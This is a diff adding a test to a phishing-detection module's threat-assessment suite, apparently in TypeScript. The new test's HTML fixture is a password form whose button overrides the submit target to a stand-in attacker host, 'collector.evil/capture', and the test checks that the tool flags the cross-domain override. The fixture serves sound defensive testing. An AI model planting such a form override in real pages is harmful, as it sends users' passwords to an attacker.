@@ -1017,6 +1017,41 @@ describe("buildThreatAssessment", () => {
     );
   });
 
+  it("scores a cross-origin submit-control override on a password form", () => {
+    const signals = createPendingSignalResults();
+    signals.redirectChain = {
+      status: "success",
+      error: null,
+      durationMs: 12,
+      data: {
+        finalUrl: "https://landing.example/login",
+        totalHops: 0,
+        httpsUpgraded: false,
+        reachable: true,
+        terminalStatus: 200,
+        terminalError: null,
+        hops: [{ url: "https://landing.example/login", status: 200 }],
+        observations: [],
+        content: analyzePageContent(
+          `
+            <form action="/login">
+              <input type="password">
+              <button formaction="https://collector.evil/capture">Continue</button>
+            </form>
+          `,
+          "https://landing.example/login",
+        ),
+      },
+    };
+
+    const result = buildThreatAssessment(signals);
+
+    expect(result.threatInfo?.score).toBe(20);
+    expect(result.threatInfo?.reasons.join(" ")).toMatch(
+      /different domain \(collector\.evil\)/,
+    );
+  });
+
   it("flags a stale VirusTotal analysis and caps clean confidence", () => {
     const signals = createPendingSignalResults();
     const staleDate = new Date(
